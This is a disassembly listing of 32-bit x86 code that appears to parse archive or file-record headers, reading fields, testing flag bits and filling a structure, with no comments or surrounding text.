  402bd1:	8b 56 08             	mov    0x8(%esi),%edx
  402bd4:	b8 00 00 01 00       	mov    $0x10000,%eax
  402bd9:	8b ca                	mov    %edx,%ecx
  402bdb:	c1 e9 05             	shr    $0x5,%ecx
  402bde:	83 e1 07             	and    $0x7,%ecx
  402be1:	d3 e0                	shl    %cl,%eax
  402be3:	89 86 f4 10 00 00    	mov    %eax,0x10f4(%esi)
  402be9:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402bec:	8b c2                	mov    %edx,%eax
  402bee:	c1 ea 0b             	shr    $0xb,%edx
  402bf1:	c1 e8 03             	shr    $0x3,%eax
  402bf4:	80 e2 01             	and    $0x1,%dl
  402bf7:	24 01                	and    $0x1,%al
  402bf9:	88 96 f3 10 00 00    	mov    %dl,0x10f3(%esi)
  402bff:	88 86 f2 10 00 00    	mov    %al,0x10f2(%esi)
  402c05:	e8 f1 9f 00 00       	call   0x40cbfb
  402c0a:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c0d:	89 46 14             	mov    %eax,0x14(%esi)
  402c10:	e8 e6 9f 00 00       	call   0x40cbfb
  402c15:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c18:	89 45 54             	mov    %eax,0x54(%ebp)
  402c1b:	e8 8f 9f 00 00       	call   0x40cbaf
  402c20:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c23:	88 46 18             	mov    %al,0x18(%esi)
  402c26:	c7 86 70 10 00 00 02 	movl   $0x2,0x1070(%esi)
  402c2d:	00 00 00 
  402c30:	e8 c6 9f 00 00       	call   0x40cbfb
  402c35:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c38:	89 86 74 10 00 00    	mov    %eax,0x1074(%esi)
  402c3e:	e8 b8 9f 00 00       	call   0x40cbfb
  402c43:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c46:	89 45 44             	mov    %eax,0x44(%ebp)
  402c49:	e8 61 9f 00 00       	call   0x40cbaf
  402c4e:	0f b6 c8             	movzbl %al,%ecx
  402c51:	89 4e 1c             	mov    %ecx,0x1c(%esi)
  402c54:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c57:	e8 53 9f 00 00       	call   0x40cbaf
  402c5c:	2c 30                	sub    $0x30,%al
  402c5e:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c61:	88 46 20             	mov    %al,0x20(%esi)
  402c64:	e8 5d 9f 00 00       	call   0x40cbc6
  402c69:	0f b7 c8             	movzwl %ax,%ecx
  402c6c:	89 4d 50             	mov    %ecx,0x50(%ebp)
  402c6f:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402c72:	e8 84 9f 00 00       	call   0x40cbfb
  402c77:	8b 56 1c             	mov    0x1c(%esi),%edx
  402c7a:	89 45 48             	mov    %eax,0x48(%ebp)
  402c7d:	89 46 24             	mov    %eax,0x24(%esi)
  402c80:	83 fa 14             	cmp    $0x14,%edx
  402c83:	73 0b                	jae    0x402c90
  402c85:	a8 10                	test   $0x10,%al
  402c87:	74 07                	je     0x402c90
  402c89:	c6 86 f1 10 00 00 01 	movb   $0x1,0x10f1(%esi)
  402c90:	33 c9                	xor    %ecx,%ecx
  402c92:	89 8e 9c 10 00 00    	mov    %ecx,0x109c(%esi)
  402c98:	38 8e 9b 10 00 00    	cmp    %cl,0x109b(%esi)
  402c9e:	74 43                	je     0x402ce3
  402ca0:	83 ea 0d             	sub    $0xd,%edx
  402ca3:	74 34                	je     0x402cd9
  402ca5:	4a                   	dec    %edx
  402ca6:	83 ea 01             	sub    $0x1,%edx
  402ca9:	74 22                	je     0x402ccd
  402cab:	83 ea 05             	sub    $0x5,%edx
  402cae:	74 11                	je     0x402cc1
  402cb0:	83 ea 06             	sub    $0x6,%edx
  402cb3:	74 0c                	je     0x402cc1
  402cb5:	c7 86 9c 10 00 00 04 	movl   $0x4,0x109c(%esi)
  402cbc:	00 00 00 
  402cbf:	eb 22                	jmp    0x402ce3
  402cc1:	c7 86 9c 10 00 00 03 	movl   $0x3,0x109c(%esi)
  402cc8:	00 00 00 
  402ccb:	eb 16                	jmp    0x402ce3
  402ccd:	c7 86 9c 10 00 00 02 	movl   $0x2,0x109c(%esi)
  402cd4:	00 00 00 
  402cd7:	eb 0a                	jmp    0x402ce3
  402cd9:	c7 86 9c 10 00 00 01 	movl   $0x1,0x109c(%esi)
  402ce0:	00 00 00 
  402ce3:	8a 46 18             	mov    0x18(%esi),%al
  402ce6:	c7 86 fc 10 00 00 02 	movl   $0x2,0x10fc(%esi)
  402ced:	00 00 00 
  402cf0:	3c 03                	cmp    $0x3,%al
  402cf2:	74 10                	je     0x402d04
  402cf4:	3c 05                	cmp    $0x5,%al
  402cf6:	74 0c                	je     0x402d04
  402cf8:	3c 06                	cmp    $0x6,%al
  402cfa:	73 12                	jae    0x402d0e
  402cfc:	89 8e fc 10 00 00    	mov    %ecx,0x10fc(%esi)
  402d02:	eb 0a                	jmp    0x402d0e
  402d04:	c7 86 fc 10 00 00 01 	movl   $0x1,0x10fc(%esi)
  402d0b:	00 00 00 
  402d0e:	89 8e 00 11 00 00    	mov    %ecx,0x1100(%esi)
  402d14:	3c 03                	cmp    $0x3,%al
  402d16:	75 22                	jne    0x402d3a
  402d18:	8b 45 48             	mov    0x48(%ebp),%eax
  402d1b:	25 00 f0 00 00       	and    $0xf000,%eax
  402d20:	3d 00 a0 00 00       	cmp    $0xa000,%eax
  402d25:	75 13                	jne    0x402d3a
  402d27:	33 c0                	xor    %eax,%eax
  402d29:	c7 86 00 11 00 00 01 	movl   $0x1,0x1100(%esi)
  402d30:	00 00 00 
  402d33:	66 89 86 04 11 00 00 	mov    %ax,0x1104(%esi)
  402d3a:	83 ff 02             	cmp    $0x2,%edi
  402d3d:	74 07                	je     0x402d46
  402d3f:	b0 01                	mov    $0x1,%al
  402d41:	39 4e 24             	cmp    %ecx,0x24(%esi)
  402d44:	7c 02                	jl     0x402d48
  402d46:	8a c1                	mov    %cl,%al
  402d48:	88 86 f8 10 00 00    	mov    %al,0x10f8(%esi)
  402d4e:	8b 46 08             	mov    0x8(%esi),%eax
  402d51:	c1 e8 08             	shr    $0x8,%eax
  402d54:	24 01                	and    $0x1,%al
  402d56:	88 86 f9 10 00 00    	mov    %al,0x10f9(%esi)
  402d5c:	74 2b                	je     0x402d89
  402d5e:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402d61:	e8 95 9e 00 00       	call   0x40cbfb
  402d66:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402d69:	8b f8                	mov    %eax,%edi
  402d6b:	e8 8b 9e 00 00       	call   0x40cbfb
  402d70:	83 7d 54 ff          	cmpl   $0xffffffff,0x54(%ebp)
  402d74:	8b d0                	mov    %eax,%edx
  402d76:	75 0b                	jne    0x402d83
  402d78:	83 fa ff             	cmp    $0xffffffff,%edx
  402d7b:	75 06                	jne    0x402d83
  402d7d:	b0 01                	mov    $0x1,%al
  402d7f:	33 c9                	xor    %ecx,%ecx
  402d81:	eb 11                	jmp    0x402d94
  402d83:	33 c9                	xor    %ecx,%ecx
  402d85:	8a c1                	mov    %cl,%al
  402d87:	eb 0b                	jmp    0x402d94
  402d89:	83 7d 54 ff          	cmpl   $0xffffffff,0x54(%ebp)
  402d8d:	8b d1                	mov    %ecx,%edx
  402d8f:	8b f9                	mov    %ecx,%edi
  402d91:	0f 94 c0             	sete   %al
  402d94:	88 86 9a 10 00 00    	mov    %al,0x109a(%esi)
  402d9a:	88 45 5b             	mov    %al,0x5b(%ebp)
  402d9d:	33 c0                	xor    %eax,%eax
  402d9f:	03 46 14             	add    0x14(%esi),%eax
  402da2:	89 86 58 10 00 00    	mov    %eax,0x1058(%esi)
  402da8:	13 f9                	adc    %ecx,%edi
  402daa:	33 c0                	xor    %eax,%eax
  402dac:	03 45 54             	add    0x54(%ebp),%eax
  402daf:	89 be 5c 10 00 00    	mov    %edi,0x105c(%esi)
  402db5:	13 d1                	adc    %ecx,%edx
  402db7:	89 86 60 10 00 00    	mov    %eax,0x1060(%esi)
  402dbd:	80 7d 5b 00          	cmpb   $0x0,0x5b(%ebp)
  402dc1:	89 96 64 10 00 00    	mov    %edx,0x1064(%esi)
  402dc7:	74 11                	je     0x402dda
  402dc9:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  402dce:	89 86 60 10 00 00    	mov    %eax,0x1060(%esi)
  402dd4:	89 86 64 10 00 00    	mov    %eax,0x1064(%esi)
  402dda:	8b 45 50             	mov    0x50(%ebp),%eax
  402ddd:	bf ff 1f 00 00       	mov    $0x1fff,%edi
  402de2:	3b c7                	cmp    %edi,%eax
  402de4:	73 02                	jae    0x402de8
  402de6:	8b f8                	mov    %eax,%edi
  402de8:	57                   	push   %edi
  402de9:	8d 85 d0 df ff ff    	lea    -0x2030(%ebp),%eax
  402def:	50                   	push   %eax
  402df0:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402df3:	e8 65 9e 00 00       	call   0x40cc5d
  402df8:	33 c9                	xor    %ecx,%ecx
  402dfa:	33 c0                	xor    %eax,%eax
  402dfc:	83 7d 18 02          	cmpl   $0x2,0x18(%ebp)
  402e00:	88 84 3d d0 df ff ff 	mov    %al,-0x2030(%ebp,%edi,1)
  402e07:	0f 94 c1             	sete   %cl
  402e0a:	49                   	dec    %ecx
  402e0b:	81 e1 50 23 00 00    	and    $0x2350,%ecx
  402e11:	81 c1 c0 22 00 00    	add    $0x22c0,%ecx
  402e17:	03 cb                	add    %ebx,%ecx
  402e19:	83 7d 18 02          	cmpl   $0x2,0x18(%ebp)
  402e1d:	89 4d 54             	mov    %ecx,0x54(%ebp)
  402e20:	75 75                	jne    0x402e97
  402e22:	33 d2                	xor    %edx,%edx
  402e24:	66 89 11             	mov    %dx,(%ecx)
  402e27:	f7 46 08 00 02 00 00 	testl  $0x200,0x8(%esi)
  402e2e:	74 41                	je     0x402e71
  402e30:	8d 4d 00             	lea    0x0(%ebp),%ecx
  402e33:	e8 3e 3b 00 00       	call   0x406976
  402e38:	8d 85 d0 df ff ff    	lea    -0x2030(%ebp),%eax
  402e3e:	50                   	push   %eax
  402e3f:	e8 4c 10 02 00       	call   0x423e90
  402e44:	40                   	inc    %eax
  402e45:	59                   	pop    %ecx
  402e46:	3b f8                	cmp    %eax,%edi
  402e48:	76 22                	jbe    0x402e6c
  402e4a:	68 00 08 00 00       	push   $0x800
  402e4f:	ff 75 54             	push   0x54(%ebp)
  402e52:	8b cf                	mov    %edi,%ecx
  402e54:	2b c8                	sub    %eax,%ecx
  402e56:	51                   	push   %ecx
  402e57:	8d 8d d0 df ff ff    	lea    -0x2030(%ebp),%ecx
  402e5d:	03 c1                	add    %ecx,%eax
  402e5f:	50                   	push   %eax
  402e60:	8b c1                	mov    %ecx,%eax
  402e62:	8d 4d 00             	lea    0x0(%ebp),%ecx
  402e65:	57                   	push   %edi
  402e66:	50                   	push   %eax
  402e67:	e8 1a 3b 00 00       	call   0x406986
  402e6c:	8b 4d 54             	mov    0x54(%ebp),%ecx
  402e6f:	33 c0                	xor    %eax,%eax
  402e71:	66 39 01             	cmp    %ax,(%ecx)
  402e74:	75 14                	jne    0x402e8a
  402e76:	6a 01                	push   $0x1
  402e78:	68 00 08 00 00       	push   $0x800
  402e7d:	51                   	push   %ecx
  402e7e:	8d 85 d0 df ff ff    	lea    -0x2030(%ebp),%eax
  402e84:	50                   	push   %eax
  402e85:	e8 30 d4 00 00       	call   0x4102ba
  402e8a:	56                   	push   %esi
  402e8b:	8b cb                	mov    %ebx,%ecx
  402e8d:	e8 a2 f2 ff ff       	call   0x402134
  402e92:	e9 3f 01 00 00       	jmp    0x402fd6
  402e97:	68 00 08 00 00       	push   $0x800
  402e9c:	51                   	push   %ecx
  402e9d:	8d 85 d0 df ff ff    	lea    -0x2030(%ebp),%eax
  402ea3:	50                   	push   %eax
  402ea4:	e8 db ec 00 00       	call   0x411b84
  402ea9:	8b 46 0c             	mov    0xc(%esi),%eax
  402eac:	2b 45 50             	sub    0x50(%ebp),%eax
  402eaf:	f7 46 08 00 04 00 00 	testl  $0x400,0x8(%esi)
  402eb6:	8d 78 e0             	lea    -0x20(%eax),%edi
  402eb9:	74 03                	je     0x402ebe
  402ebb:	8d 78 d8             	lea    -0x28(%eax),%edi
  402ebe:	85 ff                	test   %edi,%edi
  402ec0:	0f 8e f6 00 00 00    	jle    0x402fbc
  402ec6:	8d 8e 28 10 00 00    	lea    0x1028(%esi),%ecx
  402ecc:	57                   	push   %edi
  402ecd:	e8 eb f1 ff ff       	call   0x4020bd
  402ed2:	57                   	push   %edi
  402ed3:	8d be 28 10 00 00    	lea    0x1028(%esi),%edi
  402ed9:	ff 37                	push   (%edi)
  402edb:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402ede:	e8 7a 9d 00 00       	call   0x40cc5d
  402ee3:	68 78 36 43 00       	push   $0x433678
  402ee8:	ff 75 54             	push   0x54(%ebp)
  402eeb:	e8 59 0f 02 00       	call   0x423e49
  402ef0:	59                   	pop    %ecx
  402ef1:	59                   	pop    %ecx
  402ef2:	85 c0                	test   %eax,%eax
  402ef4:	0f 85 c2 00 00 00    	jne    0x402fbc
  402efa:	83 be 2c 10 00 00 14 	cmpl   $0x14,0x102c(%esi)
  402f01:	0f 82 b5 00 00 00    	jb     0x402fbc
  402f07:	8b 0f                	mov    (%edi),%ecx
  402f09:	0f b6 41 0b          	movzbl 0xb(%ecx),%eax
  402f0d:	99                   	cltd
  402f0e:	8b f0                	mov    %eax,%esi
  402f10:	8b fa                	mov    %edx,%edi
  402f12:	0f b6 41 0a          	movzbl 0xa(%ecx),%eax
  402f16:	0f a4 f7 08          	shld   $0x8,%esi,%edi
  402f1a:	99                   	cltd
  402f1b:	c1 e6 08             	shl    $0x8,%esi
  402f1e:	03 f0                	add    %eax,%esi
  402f20:	0f b6 41 09          	movzbl 0x9(%ecx),%eax
  402f24:	13 fa                	adc    %edx,%edi
  402f26:	99                   	cltd
  402f27:	0f a4 f7 08          	shld   $0x8,%esi,%edi
  402f2b:	c1 e6 08             	shl    $0x8,%esi
  402f2e:	03 f0                	add    %eax,%esi
  402f30:	0f b6 41 08          	movzbl 0x8(%ecx),%eax
  402f34:	13 fa                	adc    %edx,%edi
  402f36:	99                   	cltd
  402f37:	0f a4 f7 08          	shld   $0x8,%esi,%edi
  402f3b:	c1 e6 08             	shl    $0x8,%esi
  402f3e:	03 f0                	add    %eax,%esi
  402f40:	8b 03                	mov    (%ebx),%eax
  402f42:	13 fa                	adc    %edx,%edi
  402f44:	0f a4 f7 09          	shld   $0x9,%esi,%edi
  402f48:	c1 e6 09             	shl    $0x9,%esi
  402f4b:	89 b3 d8 21 00 00    	mov    %esi,0x21d8(%ebx)
  402f51:	8b 70 14             	mov    0x14(%eax),%esi
  402f54:	8b ce                	mov    %esi,%ecx
  402f56:	89 bb dc 21 00 00    	mov    %edi,0x21dc(%ebx)
  402f5c:	ff 15 78 32 43 00    	call   *0x433278
  402f62:	8b cb                	mov    %ebx,%ecx
  402f64:	ff d6                	call   *%esi
  402f66:	8b f2                	mov    %edx,%esi
  402f68:	8b f8                	mov    %eax,%edi
  402f6a:	56                   	push   %esi
  402f6b:	57                   	push   %edi
  402f6c:	ff b3 dc 21 00 00    	push   0x21dc(%ebx)
  402f72:	ff b3 d8 21 00 00    	push   0x21d8(%ebx)
  402f78:	e8 e7 d2 00 00       	call   0x410264
  402f7d:	56                   	push   %esi
  402f7e:	57                   	push   %edi
  402f7f:	6a 00                	push   $0x0
  402f81:	68 c8 00 00 00       	push   $0xc8
  402f86:	56                   	push   %esi
  402f87:	57                   	push   %edi
  402f88:	89 83 e0 21 00 00    	mov    %eax,0x21e0(%ebx)
  402f8e:	89 45 48             	mov    %eax,0x48(%ebp)
  402f91:	e8 0a bc 01 00       	call   0x41eba0
  402f96:	03 83 d8 21 00 00    	add    0x21d8(%ebx),%eax
  402f9c:	13 93 dc 21 00 00    	adc    0x21dc(%ebx),%edx
  402fa2:	52                   	push   %edx
  402fa3:	50                   	push   %eax
  402fa4:	e8 bb d2 00 00       	call   0x410264
  402fa9:	8b 4d 48             	mov    0x48(%ebp),%ecx
  402fac:	8b 75 4c             	mov    0x4c(%ebp),%esi
  402faf:	3b c1                	cmp    %ecx,%eax
  402fb1:	7e 09                	jle    0x402fbc
  402fb3:	8d 41 01             	lea    0x1(%ecx),%eax
  402fb6:	89 83 e0 21 00 00    	mov    %eax,0x21e0(%ebx)
  402fbc:	68 70 36 43 00       	push   $0x433670
  402fc1:	ff 75 54             	push   0x54(%ebp)
  402fc4:	e8 80 0e 02 00       	call   0x423e49
  402fc9:	59                   	pop    %ecx
  402fca:	59                   	pop    %ecx
  402fcb:	85 c0                	test   %eax,%eax
  402fcd:	75 07                	jne    0x402fd6
  402fcf:	c6 83 ce 6c 00 00 01 	movb   $0x1,0x6cce(%ebx)
  402fd6:	f7 46 08 00 04 00 00 	testl  $0x400,0x8(%esi)
  402fdd:	74 11                	je     0x402ff0
  402fdf:	6a 08                	push   $0x8
  402fe1:	8d 86 a1 10 00 00    	lea    0x10a1(%esi),%eax
  402fe7:	50                   	push   %eax
  402fe8:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402feb:	e8 6d 9c 00 00       	call   0x40cc5d
  402ff0:	ff 75 44             	push   0x44(%ebp)
  402ff3:	8d 8e 40 10 00 00    	lea    0x1040(%esi),%ecx
  402ff9:	e8 10 e4 00 00       	call   0x41140e
  402ffe:	f7 46 08 00 10 00 00 	testl  $0x1000,0x8(%esi)
  403005:	0f 84 d2 00 00 00    	je     0x4030dd
  40300b:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40300e:	e8 b3 9b 00 00       	call   0x40cbc6
  403013:	0f b7 c8             	movzwl %ax,%ecx
  403016:	8d 83 d8 32 00 00    	lea    0x32d8(%ebx),%eax
  40301c:	89 45 00             	mov    %eax,0x0(%ebp)
  40301f:	8d 83 e0 32 00 00    	lea    0x32e0(%ebx),%eax
  403025:	89 45 04             	mov    %eax,0x4(%ebp)
  403028:	8d 83 e8 32 00 00    	lea    0x32e8(%ebx),%eax
  40302e:	89 45 08             	mov    %eax,0x8(%ebp)
  403031:	33 c0                	xor    %eax,%eax
  403033:	8b f8                	mov    %eax,%edi
  403035:	89 45 0c             	mov    %eax,0xc(%ebp)
  403038:	8b c1                	mov    %ecx,%eax
  40303a:	89 7d 50             	mov    %edi,0x50(%ebp)
  40303d:	89 45 44             	mov    %eax,0x44(%ebp)
  403040:	6a 03                	push   $0x3
  403042:	59                   	pop    %ecx
  403043:	2b cf                	sub    %edi,%ecx
  403045:	8b d8                	mov    %eax,%ebx
  403047:	c0 e1 02             	shl    $0x2,%cl
  40304a:	d3 eb                	shr    %cl,%ebx
  40304c:	f6 c3 08             	test   $0x8,%bl
  40304f:	74 7c                	je     0x4030cd
  403051:	83 7c bd 00 00       	cmpl   $0x0,0x0(%ebp,%edi,4)
  403056:	74 75                	je     0x4030cd
  403058:	85 ff                	test   %edi,%edi
  40305a:	74 12                	je     0x40306e
  40305c:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40305f:	e8 97 9b 00 00       	call   0x40cbfb
  403064:	8b 4c bd 00          	mov    0x0(%ebp,%edi,4),%ecx
  403068:	50                   	push   %eax
  403069:	e8 a0 e3 00 00       	call   0x41140e
  40306e:	8b 4c bd 00          	mov    0x0(%ebp,%edi,4),%ecx
  403072:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403075:	50                   	push   %eax
  403076:	e8 9d e1 00 00       	call   0x411218
  40307b:	f6 c3 04             	test   $0x4,%bl
  40307e:	74 03                	je     0x403083
  403080:	ff 45 e4             	incl   -0x1c(%ebp)
  403083:	33 c9                	xor    %ecx,%ecx
  403085:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  403088:	83 e3 03             	and    $0x3,%ebx
  40308b:	76 2a                	jbe    0x4030b7
  40308d:	6a 03                	push   $0x3
  40308f:	5f                   	pop    %edi
  403090:	2b fb                	sub    %ebx,%edi
  403092:	c1 e7 03             	shl    $0x3,%edi
  403095:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  403098:	e8 12 9b 00 00       	call   0x40cbaf
  40309d:	8b cf                	mov    %edi,%ecx
  40309f:	0f b6 c0             	movzbl %al,%eax
  4030a2:	d3 e0                	shl    %cl,%eax
  4030a4:	83 c7 08             	add    $0x8,%edi
  4030a7:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4030aa:	0b c8                	or     %eax,%ecx
  4030ac:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4030af:	83 eb 01             	sub    $0x1,%ebx
  4030b2:	75 e1                	jne    0x403095
  4030b4:	8b 7d 50             	mov    0x50(%ebp),%edi
  4030b7:	6b c1 64             	imul   $0x64,%ecx,%eax
  4030ba:	8b 4c bd 00          	mov    0x0(%ebp,%edi,4),%ecx
  4030be:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4030c1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4030c4:	50                   	push   %eax
  4030c5:	e8 a0 e3 00 00       	call   0x41146a
  4030ca:	8b 45 44             	mov    0x44(%ebp),%eax
  4030cd:	47                   	inc    %edi
  4030ce:	89 7d 50             	mov    %edi,0x50(%ebp)
  4030d1:	83 ff 04             	cmp    $0x4,%edi
  4030d4:	0f 8c 66 ff ff ff    	jl     0x403040
  4030da:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4030dd:	33 c0                	xor    %eax,%eax
  4030df:	50                   	push   %eax
  4030e0:	50                   	push   %eax
  4030e1:	ff b6 5c 10 00 00    	push   0x105c(%esi)
  4030e7:	ff b6 58 10 00 00    	push   0x1058(%esi)
  4030ed:	ff b3 c4 6c 00 00    	push   0x6cc4(%ebx)
  4030f3:	ff b3 c0 6c 00 00    	push   0x6cc0(%ebx)
  4030f9:	e8 fd 0d 00 00       	call   0x403efb
  4030fe:	89 83 c0 6c 00 00    	mov    %eax,0x6cc0(%ebx)
  403104:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  403107:	89 93 c4 6c 00 00    	mov    %edx,0x6cc4(%ebx)
  40310d:	8a 86 f2 10 00 00    	mov    0x10f2(%esi),%al
  403113:	88 45 44             	mov    %al,0x44(%ebp)
  403116:	ff 75 44             	push   0x44(%ebp)
  403119:	e8 8e 9b 00 00       	call   0x40ccac
  40311e:	0f b7 c0             	movzwl %ax,%eax
  403121:	39 06                	cmp    %eax,(%esi)
  403123:	0f 84 f1 00 00 00    	je     0x40321a
  403129:	6a 01                	push   $0x1
  40312b:	b9 98 10 44 00       	mov    $0x441098,%ecx
  403130:	c6 83 dc 6c 00 00 01 	movb   $0x1,0x6cdc(%ebx)
  403137:	e8 47 3c 00 00       	call   0x406d83
  40313c:	80 7d 5a 00          	cmpb   $0x0,0x5a(%ebp)
  403140:	0f 85 d4 00 00 00    	jne    0x40321a
  403146:	ff 75 54             	push   0x54(%ebp)
  403149:	8d 43 32             	lea    0x32(%ebx),%eax
  40314c:	50                   	push   %eax
  40314d:	6a 1c                	push   $0x1c
  40314f:	e8 cd ee ff ff       	call   0x402021
  403154:	e9 c1 00 00 00       	jmp    0x40321a
  403159:	8d bb 20 22 00 00    	lea    0x2220(%ebx),%edi
  40315f:	8b cf                	mov    %edi,%ecx
  403161:	e8 f8 7b 00 00       	call   0x40ad5e
  403166:	6a 05                	push   $0x5
  403168:	59                   	pop    %ecx
  403169:	8d b3 fc 21 00 00    	lea    0x21fc(%ebx),%esi
  40316f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403171:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  403174:	e8 4d 9a 00 00       	call   0x40cbc6
  403179:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  40317c:	66 89 83 34 22 00 00 	mov    %ax,0x2234(%ebx)
  403183:	e8 73 9a 00 00       	call   0x40cbfb
  403188:	8a 8b 28 22 00 00    	mov    0x2228(%ebx),%cl
  40318e:	8b d0                	mov    %eax,%edx
  403190:	80 e1 01             	and    $0x1,%cl
  403193:	89 93 38 22 00 00    	mov    %edx,0x2238(%ebx)
  403199:	88 8b cd 6c 00 00    	mov    %cl,0x6ccd(%ebx)
  40319f:	8b 8b 28 22 00 00    	mov    0x2228(%ebx),%ecx
  4031a5:	c1 e9 03             	shr    $0x3,%ecx
  4031a8:	80 e1 01             	and    $0x1,%cl
  4031ab:	88 8b cc 6c 00 00    	mov    %cl,0x6ccc(%ebx)
  4031b1:	8b 8b 28 22 00 00    	mov    0x2228(%ebx),%ecx
  4031b7:	8b c1                	mov    %ecx,%eax
  4031b9:	c1 e8 02             	shr    $0x2,%eax
  4031bc:	24 01                	and    $0x1,%al
  4031be:	88 83 cf 6c 00 00    	mov    %al,0x6ccf(%ebx)
  4031c4:	8b c1                	mov    %ecx,%eax
  4031c6:	c1 e8 06             	shr    $0x6,%eax
  4031c9:	24 01                	and    $0x1,%al
  4031cb:	88 83 d3 6c 00 00    	mov    %al,0x6cd3(%ebx)
  4031d1:	8b c1                	mov    %ecx,%eax
  4031d3:	c1 e8 07             	shr    $0x7,%eax
  4031d6:	24 01                	and    $0x1,%al
  4031d8:	88 83 d4 6c 00 00    	mov    %al,0x6cd4(%ebx)
  4031de:	85 d2                	test   %edx,%edx
  4031e0:	75 0b                	jne    0x4031ed
  4031e2:	33 c0                	xor    %eax,%eax
  4031e4:	66 39 83 34 22 00 00 	cmp    %ax,0x2234(%ebx)
  4031eb:	74 02                	je     0x4031ef
  4031ed:	b0 01                	mov    $0x1,%al
  4031ef:	88 83 d0 6c 00 00    	mov    %al,0x6cd0(%ebx)
  4031f5:	8b c1                	mov    %ecx,%eax
  4031f7:	d1 e8                	shr    $1,%eax
  4031f9:	24 01                	and    $0x1,%al
  4031fb:	88 83 3c 22 00 00    	mov    %al,0x223c(%ebx)
  403201:	8b c1                	mov    %ecx,%eax
  403203:	c1 e8 08             	shr    $0x8,%eax
  403206:	24 01                	and    $0x1,%al
  403208:	c1 e9 04             	shr    $0x4,%ecx
  40320b:	80 e1 01             	and    $0x1,%cl
  40320e:	88 83 d1 6c 00 00    	mov    %al,0x6cd1(%ebx)
  403214:	88 8b d2 6c 00 00    	mov    %cl,0x6cd2(%ebx)
  40321a:	6a 07                	push   $0x7
  40321c:	5f                   	pop    %edi
  40321d:	6a 00                	push   $0x0
  40321f:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  403222:	e8 85 9a 00 00       	call   0x40ccac
  403227:	0f b7 c0             	movzwl %ax,%eax
  40322a:	39 83 fc 21 00 00    	cmp    %eax,0x21fc(%ebx)
  403230:	0f 84 9e 00 00 00    	je     0x4032d4
  403236:	8b 83 00 22 00 00    	mov    0x2200(%ebx),%eax
  40323c:	83 f8 79             	cmp    $0x79,%eax
  40323f:	0f 84 8f 00 00 00    	je     0x4032d4
  403245:	83 f8 76             	cmp    $0x76,%eax
  403248:	0f 84 86 00 00 00    	je     0x4032d4
  40324e:	83 f8 05             	cmp    $0x5,%eax
  403251:	75 53                	jne    0x4032a6
  403253:	80 bb c6 45 00 00 00 	cmpb   $0x0,0x45c6(%ebx)
  40325a:	74 4a                	je     0x4032a6
  40325c:	8b 03                	mov    (%ebx),%eax
  40325e:	8b 70 14             	mov    0x14(%eax),%esi
  403261:	8b ce                	mov    %esi,%ecx
  403263:	ff 15 78 32 43 00    	call   *0x433278
  403269:	8b cb                	mov    %ebx,%ecx
  40326b:	ff d6                	call   *%esi
  40326d:	8b 33                	mov    (%ebx),%esi
  40326f:	33 c9                	xor    %ecx,%ecx
  403271:	2b c7                	sub    %edi,%eax
  403273:	51                   	push   %ecx
  403274:	1b d1                	sbb    %ecx,%edx
  403276:	8b 4e 10             	mov    0x10(%esi),%ecx
  403279:	52                   	push   %edx
  40327a:	50                   	push   %eax
  40327b:	ff 15 78 32 43 00    	call   *0x433278
  403281:	8b cb                	mov    %ebx,%ecx
  403283:	ff 56 10             	call   *0x10(%esi)
  403286:	c6 45 5b 01          	movb   $0x1,0x5b(%ebp)
  40328a:	8b cb                	mov    %ebx,%ecx
  40328c:	e8 01 66 00 00       	call   0x409892
  403291:	f6 d8                	neg    %al
  403293:	1a c0                	sbb    %al,%al
  403295:	f6 d0                	not    %al
  403297:	22 45 5b             	and    0x5b(%ebp),%al
  40329a:	88 45 5b             	mov    %al,0x5b(%ebp)
  40329d:	83 ef 01             	sub    $0x1,%edi
  4032a0:	75 e8                	jne    0x40328a
  4032a2:	84 c0                	test   %al,%al
  4032a4:	75 2e                	jne    0x4032d4
  4032a6:	6a 03                	push   $0x3
  4032a8:	b9 98 10 44 00       	mov    $0x441098,%ecx
  4032ad:	c6 83 dc 6c 00 00 01 	movb   $0x1,0x6cdc(%ebx)
  4032b4:	e8 ca 3a 00 00       	call   0x406d83
  4032b9:	80 7d 5a 00          	cmpb   $0x0,0x5a(%ebp)
  4032bd:	74 15                	je     0x4032d4
  4032bf:	8d 43 32             	lea    0x32(%ebx),%eax
  4032c2:	50                   	push   %eax
  4032c3:	50                   	push   %eax
  4032c4:	6a 04                	push   $0x4
  4032c6:	e8 56 ed ff ff       	call   0x402021
  4032cb:	c6 83 dd 6c 00 00 01 	movb   $0x1,0x6cdd(%ebx)
  4032d2:	eb 06                	jmp    0x4032da
  4032d4:	8b 45 34             	mov    0x34(%ebp),%eax
  4032d7:	89 45 10             	mov    %eax,0x10(%ebp)
  4032da:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  4032dd:	e8 19 e3 ff ff       	call   0x4015fb
  4032e2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4032e5:	8b 45 10             	mov    0x10(%ebp),%eax
  4032e8:	5f                   	pop    %edi
